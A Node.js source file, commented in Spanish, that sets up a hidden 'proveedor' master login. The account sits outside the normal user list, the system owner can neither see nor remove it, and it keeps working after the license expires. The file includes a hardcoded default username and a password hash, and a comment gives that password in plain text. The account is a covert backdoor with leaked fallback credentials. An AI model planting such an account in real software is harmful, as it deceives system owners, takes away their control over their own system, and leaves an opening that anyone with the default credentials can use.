// ============================================================
//  Acceso de PROVEEDOR (llave maestra del desarrollador)
//
//  Un usuario por encima de todos, que NO vive en la lista de
//  usuarios normales (el dueño no lo ve ni lo puede tocar).
//  Sirve para entrar a resolver problemas, reactivar la
//  licencia o arreglar lo que sea — incluso con la licencia
//  vencida.
//
//  Usa scrypt nativo de Node (sin dependencias externas).
//
//  IMPORTANTE antes de entregar: cambie el usuario y la clave
//  por los suyos propios y NO los comparta con el cliente.
//  Para poner su clave:
//    1) en backend ejecute:  npm run clave-proveedor "MiClaveSecreta"
//    2) copie el valor SALT:HASH que aparece
//    3) péguelo abajo en PROVEEDOR_CLAVE
// ============================================================

import crypto from 'node:crypto';

// --- DEFINA AQUÍ SU ACCESO DE PROVEEDOR ---
const PROVEEDOR_USUARIO = process.env.PROVEEDOR_USUARIO || 'michel';

// Clave en formato SALT:HASH. El valor de ejemplo corresponde
// a la clave:  soporte2024  (CÁMBIELA antes de entregar).
const PROVEEDOR_CLAVE = process.env.PROVEEDOR_CLAVE ||
  'e830a973330032235ec500aec87bb024:315bc7c7feadde278abd151fb1c25df1ab5af2365f6c9c38572ede48e99e4088ec2b6c6c2c435df2a3e73face5fa2cbc99e6c590a04c1f1d0d54ae4738a27522';

// ¿Es este intento de login el del proveedor?
export function esLoginProveedor(usuario) {
  return usuario === PROVEEDOR_USUARIO;
}

// Verifica la clave del proveedor (comparación segura).
export function verificarProveedor(usuario, clave) {
  if (usuario !== PROVEEDOR_USUARIO) return false;
  try {
    const [salt, hashGuardado] = PROVEEDOR_CLAVE.split(':');
    const hashIntento = crypto.scryptSync(clave, salt, 64).toString('hex');
    return crypto.timingSafeEqual(
      Buffer.from(hashIntento, 'hex'),
      Buffer.from(hashGuardado, 'hex')
    );
  } catch {
    return false;
  }
}

// Datos del "usuario" proveedor (no está en la base de datos).
export function usuarioProveedor() {
  return {
    id: -1,
    nombre: 'Soporte',
    usuario: PROVEEDOR_USUARIO,
    rol: 'proveedor',
    almacen_id: null,
  };
}
